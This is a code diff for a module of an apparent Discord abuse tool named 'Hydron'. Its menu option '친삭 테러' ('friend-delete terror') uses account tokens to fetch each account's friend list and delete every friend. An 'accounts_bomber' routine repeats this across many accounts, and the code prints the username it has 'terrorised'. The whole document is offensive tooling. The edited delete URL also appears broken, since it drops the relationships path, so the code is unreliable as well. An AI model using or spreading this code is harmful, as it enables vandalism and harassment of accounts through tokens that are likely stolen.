@@ -1,33 +1,34 @@
-import aiohttp
-import asyncio
-
 from utils.Setting.setup_most import heads
-from utils.Setting.lib import aiohttp, asyncio, time
+from utils.Setting.lib import aiohttp, asyncio, time, colorama
+from colorama import Fore
 
+colorama.init(autoreset=True)
 
 def menu():
-    print(
-        f"""
-[\x1b[95m1\x1b[95m\x1B[37m] 친삭 테러
-[\x1b[95m2\x1b[95m\x1B[37m] 나가기
-"""
-    )
-
+    print()
+    print("[\x1b[95m1\x1b[95m\x1B[37m] 친삭 테러")
+    print("[\x1b[95m2\x1b[95m\x1B[37m] 나가기")
 
 async def remove_friend(token: str):
-    base_url = "https://discord.com/api/v10/users/@me/relationships"
+    base_url = "https://discord.com/api/v10/users/@me"
+    relationship_url = f"{base_url}/relationships"
 
     async with (
         aiohttp.ClientSession() as session,
-        session.get(base_url, headers=heads(token=token)) as response,
+        session.get(base_url, headers=heads(token=token)) as user_response,
+        session.get(relationship_url, headers=heads(token=token)) as response,
     ):
+        user_info = await user_response.json()
         friend_infos = await response.json()
-
+        
         for friend_info in friend_infos:
             async with session.delete(
                 f"{base_url}/{friend_info['id']}", headers=heads(token=token)
-            ) as response:
+                ):
                 pass
+        
+        
+        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 테러한 사용자 이름: {Fore.WHITE}{user_info['username']}#{user_info['discriminator']}{Fore.RESET}")
 
 
 async def accounts_bomber():
@@ -43,11 +44,15 @@ async def accounts_bomber():
 
 
 async def main():
+    from main import Hydron
     menu()
     option = int(input(f"[\x1b[95m>\x1b[95m\x1B[37m] 옵션: "))
+    print("\n"*7)
     if option == 1:
         await accounts_bomber()
-        time.sleep(3)
-        await __import__("main").Hydron()
+        print()
+        time.sleep(6)
+        await Hydron()
     else:
-        await __import__("main").Hydron()
+        print("\n"*6)
+        await Hydron()
